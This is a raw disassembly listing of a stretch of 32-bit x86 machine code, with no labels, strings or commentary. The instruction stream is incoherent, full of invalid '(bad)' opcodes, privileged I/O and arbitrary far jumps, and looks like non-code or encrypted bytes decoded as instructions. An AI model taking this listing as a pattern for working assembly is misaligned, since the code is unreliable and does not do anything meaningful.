  41b481:	ror    DWORD PTR [esi-0x48],1
  41b484:	add    eax,0xfb0ef9d2
  41b489:	xchg   esp,eax
  41b48a:	gs jmp 0x41b479
  41b48d:	bswap  ebp
  41b48f:	icebp  
  41b490:	outs   dx,DWORD PTR ds:[esi]
  41b491:	mov    WORD PTR [eax+0x6e],?
  41b494:	xchg   ebx,eax
  41b495:	add    eax,0x2910604d
  41b49a:	dec    edi
  41b49b:	fsub   QWORD PTR [edi]
  41b49d:	je     0x41b4a8
  41b49f:	xchg   BYTE PTR [ebx+0x1a],bh
  41b4a2:	or     al,0x42
  41b4a4:	mov    esi,0x4c2db260
  41b4a9:	jo     0x41b4b0
  41b4ab:	mov    DWORD PTR [ebp-0x76c1c821],edx
  41b4b1:	(bad)
  41b4b4:	xor    esp,DWORD PTR [eax-0x8]
  41b4b7:	(bad)  
  41b4b8:	stc    
  41b4b9:	pop    ebp
  41b4ba:	fisubr DWORD PTR [edi+0x2d0ed598]
  41b4c0:	xor    eax,0x952963de
  41b4c5:	adc    DWORD PTR [ebx],ebp
  41b4c7:	(bad)  
  41b4c9:	push   0x5a
  41b4cb:	outs   dx,BYTE PTR ds:[esi]
  41b4cc:	fwait
  41b4cd:	inc    eax
  41b4ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4cf:	and    edx,DWORD PTR [edi]
  41b4d1:	sbb    eax,0x33cad751
  41b4d6:	aas    
  41b4d7:	sbb    DWORD PTR [ebx],esp
  41b4d9:	dec    edi
  41b4da:	js     0x41b53c
  41b4dc:	jge    0x41b551
  41b4de:	jmp    0xdece:0x39f33ce
  41b4e5:	mov    bl,0x8f
  41b4e7:	inc    eax
  41b4e8:	mov    bh,0xf2
  41b4ea:	xchg   edi,eax
  41b4eb:	push   ds
  41b4ec:	fsubrp st(4),st
  41b4ee:	pop    edx
  41b4ef:	push   ecx
  41b4f0:	ja     0x41b51f
  41b4f2:	in     al,dx
  41b4f3:	and    cl,dl
  41b4f5:	repz xchg esp,eax
  41b4f7:	xchg   ebx,eax
  41b4f8:	or     eax,0xb6d78c52
  41b4fd:	idiv   BYTE PTR [eax]
  41b4ff:	out    dx,al
  41b500:	mov    bh,0x9d
  41b502:	mov    ebx,0x8059ba2c
  41b507:	into   
  41b508:	push   ebp
  41b509:	mov    al,ds:0x13e88848
  41b50e:	test   BYTE PTR [edx+0x79],ch
	...
  41b571:	add    BYTE PTR [eax],al
  41b573:	add    ah,dl
  41b575:	in     al,dx
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	ret    0xd109
  41b583:	cdq    
  41b584:	and    al,BYTE PTR [bx+di]
  41b587:	add    BYTE PTR ds:0x73000001,al
  41b58d:	sub    ebp,DWORD PTR [edx+ecx*4]
  41b590:	je     0x41b556
  41b592:	sub    al,0xe8
  41b594:	(bad)  
  41b595:	fwait
  41b596:	or     DWORD PTR [esp+ebx*1+0x42aaa27f],esp
  41b59d:	sbb    DWORD PTR [ecx],esi
  41b59f:	gs inc ebx
  41b5a1:	(bad)  
  41b5a2:	xor    al,0x5b
  41b5a4:	pop    esi
  41b5a5:	pop    ebp
  41b5a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5a7:	mov    ds:0xf66c0dca,eax
  41b5ac:	jmp    eax
  41b5ae:	fs dec edi
  41b5b0:	gs pop eax
  41b5b2:	leave  
  41b5b3:	repz jae 0x41b540
  41b5b6:	stos   BYTE PTR es:[edi],al
  41b5b7:	ret    0xeb4f
  41b5ba:	sbb    al,dh
  41b5bc:	ins    DWORD PTR es:[edi],dx
  41b5bd:	fs push ecx
  41b5bf:	inc    esi
  41b5c0:	mov    dh,0xc4
  41b5c2:	jle    0x41b5b2
  41b5c4:	into   
  41b5c5:	push   esp
  41b5c6:	dec    edi
  41b5c7:	and    eax,DWORD PTR [ecx+0x3d8b6bfd]
  41b5cd:	add    al,0xdd
  41b5cf:	add    eax,0x60d7e40e
  41b5d4:	jecxz  0x41b5e7
  41b5d6:	sub    eax,0xeead5a02
  41b5db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5dc:	fstp   QWORD PTR [ecx+0x79d7d66c]
  41b5e2:	in     eax,dx
  41b5e3:	push   0x45
  41b5e5:	imul   ebx,DWORD PTR ds:0x447f7ec3,0xaf2f1d5e
  41b5ef:	outs   dx,BYTE PTR ds:[esi]
  41b5f0:	hlt    
  41b5f1:	mov    ch,0x12
  41b5f3:	add    eax,0xb6637892
  41b5f8:	ins    BYTE PTR es:[edi],dx
  41b5f9:	aad    0x64
  41b5fb:	inc    edx
  41b5fc:	pop    ss
  41b5fd:	add    al,0x21
  41b5ff:	inc    edx
  41b600:	and    edx,DWORD PTR [eax-0x4e]
  41b603:	aas    
  41b604:	mov    ds:0x329ced0c,eax
  41b609:	mov    ch,0xbd
  41b60b:	mov    ebp,0x579a20d6
  41b610:	popw   ds
  41b612:	mov    edx,ebx
  41b614:	dec    edi
  41b615:	and    bh,BYTE PTR [esi]
  41b617:	fs mov bl,0xe4
  41b61a:	pop    ecx
  41b61b:	test   al,0x73
  41b61d:	cmp    cl,al
  41b61f:	daa    
  41b620:	imul   dl
  41b622:	pushf  
  41b623:	dec    ebx
  41b624:	jge    0x41b5e5
  41b626:	and    eax,0x4e634305
  41b62b:	jp     0x41b61e
  41b62d:	xchg   DWORD PTR [edx+0x7a],ebp
  41b630:	sbb    bh,BYTE PTR [esi+ecx*8-0x6f]
  41b634:	sbb    ch,ch
  41b636:	rcr    DWORD PTR [ecx-0x35f5ee65],1
  41b63c:	ror    bh,1
  41b63e:	inc    esp
  41b63f:	push   ebp
  41b640:	jnp    0x41b68c
  41b642:	sbb    BYTE PTR [ecx-0x8b1e985],bh
  41b648:	lds    esi,FWORD PTR [edi-0x55e787b8]
  41b64e:	pop    ds
  41b64f:	cmp    al,0x5d
  41b651:	pop    edx
  41b652:	mov    esp,ecx
  41b654:	pop    ss
  41b655:	inc    ecx
  41b656:	cmp    ch,dl
  41b658:	xor    DWORD PTR [edx],ebp
  41b65a:	mov    esi,0xa460c65c
  41b65f:	and    BYTE PTR [ebx-0x703213a1],dl
  41b665:	mov    bh,0x8d
  41b667:	hlt    
  41b668:	xchg   edi,eax
  41b669:	pop    ds
  41b66a:	and    DWORD PTR [edx],ebx
  41b66c:	into   
  41b66d:	shl    BYTE PTR [ebp+0x47b5d1b3],0xf2
  41b674:	in     al,0xd0
  41b676:	push   edx
  41b677:	aam    0xfe
  41b679:	popa   
  41b67a:	cdq    
  41b67b:	ret    0xe5b8
  41b67e:	adc    eax,0x39c4e174
  41b683:	push   edx
  41b684:	xor    BYTE PTR [edi+0x2c56b547],ah
  41b68a:	fisttp QWORD PTR [ebx+0x31]
  41b68d:	neg    BYTE PTR [ebx]
  41b68f:	ja     0x41b6c9
	...
  41b6f1:	add    BYTE PTR [eax],al
  41b6f3:	add    BYTE PTR [eax-0x2469e49d],ch
  41b6f9:	(bad)  
  41b6fa:	lods   eax,DWORD PTR ds:[esi]
  41b6fb:	jg     0x41b6f8
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	mov    al,ds:0x6c67cb56
  41b705:	and    eax,DWORD PTR [ecx]
  41b707:	add    BYTE PTR ds:0x1f000001,al
  41b70d:	pushf  
  41b70e:	inc    ebx
  41b70f:	mov    ax,0x98b2
  41b713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b714:	xor    BYTE PTR ds:0x6fc5bd2c,dl
  41b71a:	and    DWORD PTR [eax+ebx*8],ecx
  41b71d:	cld    
  41b71e:	aaa    
  41b71f:	sub    eax,0x86a96c39
  41b724:	call   0xa6269b3d
  41b729:	dec    edi
  41b72a:	push   esp
  41b72b:	sahf   
  41b72c:	jnp    0x41b6e7
  41b72e:	xor    dh,BYTE PTR [edx+0x3d]
  41b731:	pop    edi
  41b732:	jno    0x41b78e
  41b734:	out    0xae,al
  41b736:	lds    ebp,FWORD PTR [ecx+0x4c2de702]
  41b73c:	mov    bl,0x68
  41b73e:	jp     0x41b719
  41b740:	rol    BYTE PTR [edx-0x11],1
  41b743:	mov    eax,fs
  41b745:	dec    ebp
  41b746:	mov    edx,0xb28aa4cc
  41b74b:	xlat   BYTE PTR ds:[ebx]
  41b74c:	outs   dx,BYTE PTR ds:[esi]
  41b74d:	mov    eax,ds:0xc4c76bbc
  41b752:	xchg   esi,eax
  41b753:	fs mov ebp,0xec0b2aab
  41b759:	dec    esi
  41b75a:	fmulp  st(3),st
  41b75c:	es adc eax,0x54431627
  41b762:	xchg   edi,eax
  41b763:	jne    0x41b7da
  41b765:	iret   
  41b766:	jne    0x41b758
  41b768:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b769:	fcmovb st,st(0)
  41b76b:	jecxz  0x41b733
  41b76d:	cmp    edx,esp
  41b76f:	lea    eax,[ecx+0x15b2522b]
  41b775:	loop   0x41b71e
  41b777:	push   ds
  41b778:	call   0x3d4ceafe
  41b77d:	add    DWORD PTR [ebp-0x6dd35b2a],0xffffffc2
  41b784:	push   ss
  41b785:	mov    al,0x6c
  41b787:	loopne 0x41b7af
  41b789:	mov    cl,0x95
  41b78b:	dec    ebp
  41b78c:	outs   dx,BYTE PTR ds:[esi]
  41b78d:	(bad)  [edx+0x2b918f30]
  41b793:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b794:	jg     0x41b7c1
  41b796:	lock xlat BYTE PTR ds:[ebx]
  41b798:	push   edi
  41b799:	or     al,0xfc
  41b79b:	mov    cl,BYTE PTR [edx]
  41b79d:	sbb    esi,esp
  41b79f:	add    al,0x3f
  41b7a1:	(bad)  
  41b7a2:	jp     0x41b801
  41b7a4:	sbb    edx,DWORD PTR [edx+0x28baf713]
  41b7aa:	adc    eax,edx
  41b7ac:	adc    BYTE PTR [edi],0x5d
  41b7af:	fimul  DWORD PTR [eax]
  41b7b1:	daa    
  41b7b2:	xchg   edx,eax
  41b7b3:	mov    ebx,0x35cc35c4
  41b7b8:	sub    DWORD PTR [eax-0x40fbb0e7],0xeeeaa5db
  41b7c2:	mov    ebp,0x9cf0856
  41b7c7:	adc    edi,DWORD PTR [eax+0x3d4f99cb]
  41b7cd:	nop
  41b7ce:	sub    eax,0x5437e329
  41b7d3:	fsubr  QWORD PTR [ecx-0x7f]
  41b7d6:	sub    edi,eax
  41b7d8:	shr    BYTE PTR [esi-0x3b],0x8e
  41b7dc:	jbe    0x41b827
  41b7de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7df:	fwait
  41b7e0:	lods   al,BYTE PTR ds:[esi]
  41b7e1:	sub    al,0x6b
  41b7e3:	stos   DWORD PTR es:[edi],eax
  41b7e4:	adc    edx,edi
  41b7e6:	cmp    esp,edi
  41b7e8:	lahf   
  41b7e9:	retf   
  41b7ea:	push   edi
  41b7eb:	and    BYTE PTR [ebx-0x3965b5c4],0xd7
  41b7f2:	retf   
  41b7f3:	mov    edi,DWORD PTR [esi+0x3c5dea34]
  41b7f9:	fild   QWORD PTR [edi+ebp*8+0x725cc0bb]
  41b800:	cdq    
  41b801:	dec    esp
  41b802:	mov    al,0x49
  41b804:	ret    
  41b805:	or     BYTE PTR [ebx],dh
  41b807:	dec    esi
  41b808:	dec    edi
  41b809:	jo     0x41b7c8
  41b80b:	lods   eax,DWORD PTR ds:[esi]
  41b80c:	into   
  41b80d:	lds    ebx,FWORD PTR [ebx]
  41b80f:	pop    ss
  41b810:	jmp    0x41b815
	...
  41b871:	add    BYTE PTR [eax],al
  41b873:	add    BYTE PTR [edx-0x8b13804],cl
  41b879:	jg     0x41b806
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0x6b
  41b881:	sbb    BYTE PTR [edx],bl
  41b883:	mov    al,0x71
  41b885:	and    al,0x1
  41b887:	add    BYTE PTR ds:0xed000001,al
  41b88d:	in     al,0x81
  41b88f:	lods   al,BYTE PTR cs:[esi]
  41b891:	push   cs
  41b892:	retf   0xb5a5
  41b895:	xlat   BYTE PTR ds:[ebx]
  41b896:	inc    ecx
  41b897:	les    ebp,FWORD PTR [ebp+0x137a044f]
  41b89d:	stos   DWORD PTR es:[edi],eax
  41b89e:	(bad)  [esp+edx*1-0x73]
  41b8a2:	mov    eax,DWORD PTR [edx-0x68]
  41b8a5:	sbb    eax,0xaba86af3
  41b8aa:	out    0x66,eax
  41b8ac:	dec    ebp
  41b8ad:	iret   
  41b8ae:	cmp    dl,BYTE PTR gs:[edx+0x46293e24]
  41b8b5:	icebp  
  41b8b6:	jo     0x41b918
  41b8b8:	inc    esi
  41b8b9:	shr    DWORD PTR [esi],1
  41b8bb:	out    dx,eax
  41b8bc:	cs dec ebp
  41b8be:	mov    edx,ecx
  41b8c0:	xor    eax,0xf68fe261
  41b8c5:	inc    esp
  41b8c6:	lods   al,BYTE PTR ds:[esi]
  41b8c7:	xchg   edx,eax
  41b8c8:	sub    edi,eax
  41b8ca:	ret    0x534b
  41b8cd:	(bad)  
  41b8ce:	dec    ebx
  41b8cf:	mov    ds:0xc31a1eae,eax
  41b8d4:	sbb    DWORD PTR [edx+0x321b9beb],0x35
  41b8db:	jp     0x41b875
  41b8dd:	and    dh,cl
  41b8df:	dec    edi
  41b8e0:	arpl   di,cx
  41b8e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8e3:	call   DWORD PTR [eax+ecx*2+0x41431a80]
  41b8ea:	call   0x10ce:0xb47de840
  41b8f1:	adc    BYTE PTR [ecx],0xef
  41b8f4:	sbb    eax,0x8c570481
  41b8f9:	cwde   
  41b8fa:	js     0x41b89f
  41b8fc:	(bad)  
  41b8fd:	mov    ebx,0xf3691e0c
  41b902:	test   DWORD PTR [ecx+eiz*1],ecx
  41b905:	mov    WORD PTR [edi],ss
  41b907:	ret    0xfb46
  41b90a:	mov    eax,ds:0xc433a9b7
  41b90f:	fcmovnu st,st(0)
  41b911:	inc    ebx
  41b912:	int3   
  41b913:	shl    BYTE PTR gs:[edi-0x56],cl
  41b917:	aaa    
  41b918:	mov    bh,BYTE PTR [eax+esi*2+0x1]
  41b91c:	sar    DWORD PTR [ebx],cl
  41b91e:	adc    BYTE PTR [eax+ebp*8-0x69979509],bl
  41b925:	or     bh,BYTE PTR [ecx+0x244b3660]
  41b92b:	cmc    
  41b92c:	cmp    al,0xb7
  41b92e:	jle    0x41b95a
  41b930:	jecxz  0x41b927
  41b932:	mov    al,0x2
  41b934:	add    BYTE PTR [eax-0x6d93434a],0x9b
  41b93b:	inc    edx
  41b93c:	aad    0x7
  41b93e:	adc    eax,0xe93ad464
  41b943:	shl    DWORD PTR [edx],cl
  41b945:	mov    gs,WORD PTR [edx-0x5a25c02c]
  41b94b:	and    esp,ebx
  41b94d:	neg    DWORD PTR [edx-0x622efe2]
  41b953:	mov    al,0xb2
  41b955:	jnp    0x41b9a1
  41b957:	test   al,0x9
  41b959:	sahf   
  41b95a:	dec    ebp
  41b95b:	dec    ebx
  41b95c:	imul   ecx,DWORD PTR ds:0x39730d61,0x52facbcd
  41b966:	pop    ds
  41b967:	jge    0x41b922
  41b969:	gs data16 (bad) 
  41b96c:	test   al,0xad
  41b96e:	xchg   esp,eax
  41b96f:	xor    eax,0x59bde68b
  41b974:	sbb    al,BYTE PTR cs:[edx-0x7c8b162d]
  41b97b:	pop    esi
  41b97c:	mov    eax,ds:0xeaeee0cf
  41b981:	aam    0x98
  41b983:	(bad)  
  41b984:	rcl    BYTE PTR [eax],0x6
  41b987:	rol    esp,cl
  41b989:	in     al,0x81
  41b98b:	jg     0x41b9bc
  41b98d:	aam    0xe4
  41b98f:	inc    ebp
  41b990:	repnz add BYTE PTR [eax],al
	...
  41b9f3:	add    bl,al
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	ja     0x41ba55
  41ba02:	pop    ebx
  41ba03:	or     al,0x76
  41ba05:	and    eax,0x1050001
  41ba0a:	add    BYTE PTR [eax],al
  41ba0c:	pop    esp
  41ba0d:	cmp    ebx,DWORD PTR [ecx]
  41ba0f:	pop    esi
  41ba10:	cld    
  41ba11:	mov    ds:0x2ad54f69,al
  41ba16:	call   0x4d0a:0xf77daedf
  41ba1d:	jle    0x41ba4c
  41ba1f:	dec    esp
  41ba20:	int    0x59
  41ba22:	lods   al,BYTE PTR ds:[esi]
  41ba23:	jns    0x41ba0d
  41ba25:	leave  
  41ba26:	neg    BYTE PTR [edi]
  41ba28:	dec    edi
  41ba29:	inc    ebx
  41ba2a:	or     eax,0x6e1bd4c
  41ba2f:	mov    ds,edx
  41ba31:	fdivp  st(1),st
  41ba33:	popf   
  41ba34:	xor    ch,ch
  41ba36:	(bad)  
  41ba37:	mov    esp,0x3962615f
  41ba3c:	adc    DWORD PTR [ebx+esi*8],ecx
  41ba3f:	push   ebx
  41ba40:	int3   
  41ba41:	push   0x846e2435
  41ba46:	adc    eax,0xff02e165
  41ba4b:	fidivr DWORD PTR [ecx]
  41ba4d:	in     eax,0x56
  41ba4f:	pushf  
  41ba50:	out    0x7c,eax
  41ba52:	lea    ecx,[ecx+esi*1]
  41ba55:	loop   0x41b9fa
  41ba57:	push   ecx
  41ba58:	xlat   BYTE PTR ds:[ebx]
  41ba59:	pop    eax
  41ba5a:	ja     0x41b9e4
  41ba5c:	enter  0x16,0x60
  41ba60:	push   esp
  41ba61:	xor    DWORD PTR [edx-0x64],ecx
  41ba64:	enter  0xc870,0x4a
  41ba68:	into   
  41ba69:	pop    ebp
  41ba6a:	cmp    esp,esp
  41ba6c:	sbb    esi,DWORD PTR [edi-0x723ceae4]
  41ba72:	jmp    0x41ba01
  41ba74:	lock xor ah,cl
  41ba77:	dec    ebp
  41ba78:	fs mov edx,0xc558bf15
  41ba7e:	fcomp  DWORD PTR [edx]
  41ba80:	fst    QWORD PTR [edx+0x6eec4ecd]
  41ba86:	inc    ecx
  41ba87:	push   edx
  41ba88:	or     eax,0x27b79cb7
  41ba8d:	js     0x41ba2a
  41ba8f:	jle    0x41ba65
  41ba91:	icebp  
  41ba92:	inc    ecx
  41ba93:	sti    
  41ba94:	outs   dx,DWORD PTR ds:[esi]
  41ba95:	add    eax,0x4ef11c2f
  41ba9a:	jae    0x41ba2c
  41ba9c:	outs   dx,BYTE PTR ds:[esi]
  41ba9d:	daa    
  41ba9e:	dec    ebx
  41ba9f:	mov    bh,0xa2
  41baa1:	loop   0x41baa1
  41baa3:	mov    ecx,0x64c66f36
  41baa8:	dec    ebx
  41baa9:	pop    ebp
  41baaa:	adc    eax,0x8a3b9f2a
  41baaf:	jae    0x41ba3e
  41bab1:	xchg   edi,eax
  41bab2:	jb     0x41baf2
  41bab4:	xor    eax,0x27a04b25
  41bab9:	stos   BYTE PTR es:[edi],al
  41baba:	dec    edx
  41babb:	mov    esi,0x785851a7
  41bac0:	sbb    esi,edx
  41bac2:	jle    0x41ba44
  41bac4:	mov    ch,0xec
  41bac6:	pop    ebp
  41bac7:	out    0xb2,eax
  41bac9:	retf   0xb6d0
  41bacc:	xchg   edx,eax
  41bacd:	pop    ds
  41bace:	or     BYTE PTR [edx-0x33],dh
  41bad1:	push   0xfffffff4
  41bad3:	add    dl,BYTE PTR [esp+ecx*1]
  41bad6:	test   al,0x87
  41bad8:	pop    ebp
  41bad9:	int3   
  41bada:	andps  xmm0,XMMWORD PTR gs:[edi]
  41bade:	push   esp
  41badf:	or     ebx,ebx
  41bae1:	lea    edx,[ecx+0x1e172701]
  41bae7:	in     eax,dx
  41bae8:	cmp    eax,0x9db297a7
  41baed:	inc    esp
  41baee:	arpl   sp,di
  41baf0:	pop    es
  41baf1:	test   BYTE PTR [ebx-0x68],cl
  41baf4:	jle    0x41ba94
  41baf6:	aas    
  41baf7:	mov    ch,0xce
  41baf9:	push   esi
  41bafa:	out    dx,eax
  41bafb:	mov    bh,0x7a
  41bafd:	adc    eax,0x65f09912
  41bb02:	sar    BYTE PTR [ebp-0x14f63241],1
  41bb08:	mov    ch,0x28
  41bb0a:	mov    eax,ds:0x59e2fcbe
  41bb0f:	inc    esi
  41bb10:	das    
	...
  41bb71:	add    BYTE PTR [eax],al
  41bb73:	add    BYTE PTR [edx],cl
  41bb75:	mov    eax,0xbfb7aaa5
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi+0x61],cx
  41bb81:	dec    ebp
  41bb82:	push   esp
  41bb83:	xor    DWORD PTR [ebx+0x26],edi
  41bb86:	add    DWORD PTR [eax],eax
  41bb88:	add    eax,0x80000001
  41bb8d:	pop    edx
  41bb8e:	xchg   ecx,eax
  41bb8f:	push   ss
  41bb90:	xchg   BYTE PTR [eax+0x7a753c5c],dh
  41bb96:	popa   
  41bb97:	aas    
  41bb98:	sub    BYTE PTR [edx+eiz*2-0x58462bb2],cl
  41bb9f:	cdq    
  41bba0:	or     esp,ecx
  41bba2:	cld    
  41bba3:	(bad)  
  41bba4:	push   0xffffffc0
  41bba6:	div    dl
  41bba8:	inc    esi
  41bba9:	jb     0x41bc00
  41bbab:	not    BYTE PTR [ecx+0x6b3ed2a4]
  41bbb1:	mov    eax,0xb35967bc
  41bbb6:	sub    eax,0x6fbdea58
  41bbbb:	iret   
  41bbbc:	adc    ch,ch
  41bbbe:	in     eax,dx
  41bbbf:	in     eax,0xb9
  41bbc1:	push   cs
  41bbc2:	stos   BYTE PTR es:[edi],al
  41bbc3:	cmp    al,0xd2
  41bbc5:	loopne 0x41bbbd
  41bbc7:	mov    ss,WORD PTR [ebp-0x44]
  41bbca:	pop    edi
  41bbcb:	mov    edi,0x4603f798
  41bbd0:	hlt    
  41bbd1:	lds    ebx,FWORD PTR [ebx]
  41bbd3:	and    ecx,esi
  41bbd5:	movntq QWORD PTR [ebx-0x182fa11e],mm5
  41bbdc:	push   0x4e
  41bbde:	dec    esp
  41bbdf:	cs nop
  41bbe1:	scas   al,BYTE PTR es:[edi]
  41bbe2:	xchg   DWORD PTR [ecx-0xc],ebx
  41bbe5:	sbb    DWORD PTR [ecx+0x7],0xa90628c1
  41bbec:	push   ebx
  41bbed:	sub    eax,0xde19db80
  41bbf2:	jae    0x41bc47
  41bbf4:	cld    
  41bbf5:	and    BYTE PTR [esi+0x6],dl
  41bbf8:	push   ss
  41bbf9:	push   0x2f883d0b
  41bbfe:	ror    ah,0xe2
  41bc01:	aam    0x33
  41bc03:	mov    DWORD PTR [eax-0x66],edi
  41bc06:	jp     0x41bc60
  41bc08:	(bad)  
  41bc09:	mov    ecx,0xf2a81557
  41bc0e:	xchg   ebx,eax
  41bc0f:	xor    al,0xaf
  41bc11:	jl     0x41bbf3
  41bc13:	xrelease mov BYTE PTR [ebx],bl
  41bc16:	mov    bl,0x69
  41bc18:	repz and DWORD PTR [ecx-0x1d],0xffffffb6
  41bc1d:	jle    0x41bbef
  41bc1f:	rcr    DWORD PTR [edi-0x6f590f7a],cl
  41bc25:	xor    BYTE PTR es:[eax],bh
  41bc28:	stc    
  41bc29:	adc    al,0x52
  41bc2b:	dec    DWORD PTR [esi]
  41bc2d:	or     bl,BYTE PTR [eax-0x1effdd86]
  41bc33:	push   ss
  41bc34:	popf   
  41bc35:	es in  al,dx
  41bc37:	ja     0x41bbf6
  41bc39:	or     DWORD PTR [edx],edx
  41bc3b:	jo     0x41bbea
  41bc3d:	out    0x29,al
  41bc3f:	pop    ds
  41bc40:	retf   
  41bc41:	(bad)  
  41bc42:	push   esp
  41bc43:	or     DWORD PTR [edi],edx
  41bc45:	cmp    BYTE PTR [edx-0x4225d608],dh
  41bc4b:	stc    
  41bc4c:	mov    ebp,0x12a3bfb6
  41bc51:	daa    
  41bc52:	xor    BYTE PTR [eax],ah
  41bc54:	push   ebp
  41bc55:	(bad)  
  41bc56:	dec    esi
  41bc57:	mov    ebp,0x61133c66
  41bc5c:	add    BYTE PTR [edi-0x1ae3203c],bh
  41bc62:	js     0x41bc51
  41bc64:	cmc    
  41bc65:	push   0x75bd5ca
  41bc6a:	push   ebp
  41bc6b:	arpl   WORD PTR [ecx+0x2ac0fdd5],sp
  41bc71:	ficom  DWORD PTR [esi-0x12c34ac9]
  41bc77:	add    edi,ebp
  41bc79:	(bad)  
  41bc7a:	call   esp
  41bc7c:	outs   dx,BYTE PTR ds:[esi]
  41bc7d:	out    dx,al
  41bc7e:	jne    0x41bcad
  41bc80:	(bad)  
  41bc81:	xchg   ebp,eax
  41bc82:	lods   eax,DWORD PTR ds:[esi]
  41bc83:	push   ebp
  41bc84:	and    al,0x96
  41bc86:	fidiv  DWORD PTR ds:0x99437b78
  41bc8c:	fcmovbe st,st(7)
  41bc8e:	fpatan 
  41bc90:	in     eax,dx
	...
  41bcf1:	add    BYTE PTR [eax],al
  41bcf3:	add    dl,dl
  41bcf5:	xor    bh,dl
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0x3d76d9d8
  41bd02:	jno    0x41bd33
  41bd04:	and    BYTE PTR [edi],0x1
  41bd07:	add    BYTE PTR ds:0x76000001,al
  41bd0d:	mov    WORD PTR [ecx-0x48],cs
  41bd10:	inc    eax
  41bd11:	inc    ecx
  41bd12:	nop
  41bd13:	cli    
  41bd14:	out    dx,al
  41bd15:	push   ds
  41bd16:	push   cs
  41bd17:	pop    edx
  41bd18:	stos   BYTE PTR es:[edi],al
  41bd19:	fs jmp 0x41bd03
  41bd1c:	popa   
  41bd1d:	push   ecx
  41bd1e:	loope  0x41bcdf
  41bd20:	xor    DWORD PTR [eax+eax*8+0x4de91bb2],edx
  41bd27:	lock icebp 
  41bd29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd2a:	das    
  41bd2b:	dec    edx
  41bd2c:	push   edi
  41bd2d:	arpl   WORD PTR [eax+0x20],di
  41bd30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd31:	add    DWORD PTR [esi+0x28a3d1ef],ebp
  41bd37:	lods   al,BYTE PTR ds:[esi]
  41bd38:	mov    esi,0x162bca1a
  41bd3d:	popa   
  41bd3e:	sbb    al,0xde
  41bd40:	std    
  41bd41:	mov    dl,BYTE PTR [edx-0x46]
  41bd44:	xchg   DWORD PTR [esp+esi*2],ecx
  41bd47:	rol    BYTE PTR [eax+0x39dfc4ac],0x7e
  41bd4e:	dec    ebp
  41bd4f:	shl    DWORD PTR [eax+ebp*8-0x1],cl
  41bd53:	or     eax,0x830c7bdf
  41bd58:	les    ebx,FWORD PTR [esi]
  41bd5a:	icebp  
  41bd5b:	mov    DWORD PTR [eax],esp
  41bd5d:	daa    
  41bd5e:	sub    dl,BYTE PTR [ebx+0x11]
  41bd61:	jbe    0x41bd19
  41bd63:	ret    0x7c3
  41bd66:	test   esi,edi
  41bd68:	push   edi
  41bd69:	mov    esi,0xa4e72628
  41bd6e:	inc    ecx
  41bd6f:	addr16 shl dl,cl
  41bd72:	jecxz  0x41bd6d
  41bd74:	cmp    BYTE PTR [ecx+0x7b],dl
  41bd77:	or     BYTE PTR [esi],0x3c
  41bd7a:	jge    0x41bd93
  41bd7c:	mov    bh,0x36
  41bd7e:	es xchg esi,eax
  41bd80:	xchg   esp,eax
  41bd81:	in     al,dx
  41bd82:	mov    bl,0x4a
  41bd84:	mov    ebx,0xa11f78f0
  41bd89:	push   ebx
  41bd8a:	adc    DWORD PTR [eax],0x40bbecf3
  41bd90:	or     DWORD PTR [eax+0x6a],esi
  41bd93:	xor    al,0x3d
  41bd95:	inc    eax
  41bd96:	cs dec esp
  41bd98:	arpl   WORD PTR [eax-0x19],bp
  41bd9b:	xor    al,0x1d
  41bd9d:	mov    ebp,0xc7036dcf
  41bda2:	inc    eax
  41bda3:	or     al,0x7e
  41bda5:	out    0xee,eax
  41bda7:	outs   dx,BYTE PTR ds:[esi]
  41bda8:	lods   eax,DWORD PTR ds:[esi]
  41bda9:	aaa    
  41bdaa:	ja     0x41bd55
  41bdac:	jecxz  0x41be19
  41bdae:	sub    BYTE PTR [ebp-0x7af4de28],0xad
  41bdb5:	pop    ebx
  41bdb6:	inc    esi
  41bdb7:	int    0x1f
  41bdb9:	xchg   ecx,eax
  41bdba:	mov    eax,0xab220903
  41bdbf:	mov    ebp,0x656269a2
  41bdc4:	stc    
  41bdc5:	sar    ebp,1
  41bdc7:	(bad)  
  41bdc8:	rcr    BYTE PTR [esi],cl
  41bdca:	sahf   
  41bdcb:	in     al,0x9e
  41bdcd:	sub    DWORD PTR [ecx+0x44],edx
  41bdd0:	icebp  
  41bdd1:	mov    bh,0x9a
  41bdd3:	inc    edi
  41bdd4:	les    edi,FWORD PTR [esi+0x44]
  41bdd7:	int    0x57
  41bdd9:	pop    ds
  41bdda:	xchg   edx,eax
  41bddb:	and    esp,DWORD PTR [esi+0x168cb063]
  41bde1:	and    edi,DWORD PTR [ebx]
  41bde3:	sbb    al,0x72
  41bde5:	pop    edx
  41bde6:	loopne 0x41bdf7
  41bde8:	xchg   edi,eax
  41bde9:	push   ss
  41bdea:	adc    bh,BYTE PTR [ebx+0x478b1572]
  41bdf0:	out    0x68,eax
  41bdf2:	pop    edi
  41bdf3:	(bad)  
  41bdf4:	div    BYTE PTR [edi+ebp*8-0x20]
  41bdf8:	sahf   
  41bdf9:	xchg   esp,eax
  41bdfa:	and    eax,0x5f04486c
  41bdff:	or     dh,dh
  41be01:	ret    
  41be02:	jo     0x41bdcb
  41be04:	xor    DWORD PTR [eax-0x3accf63b],ebp
  41be0a:	adc    eax,0xf9f78026
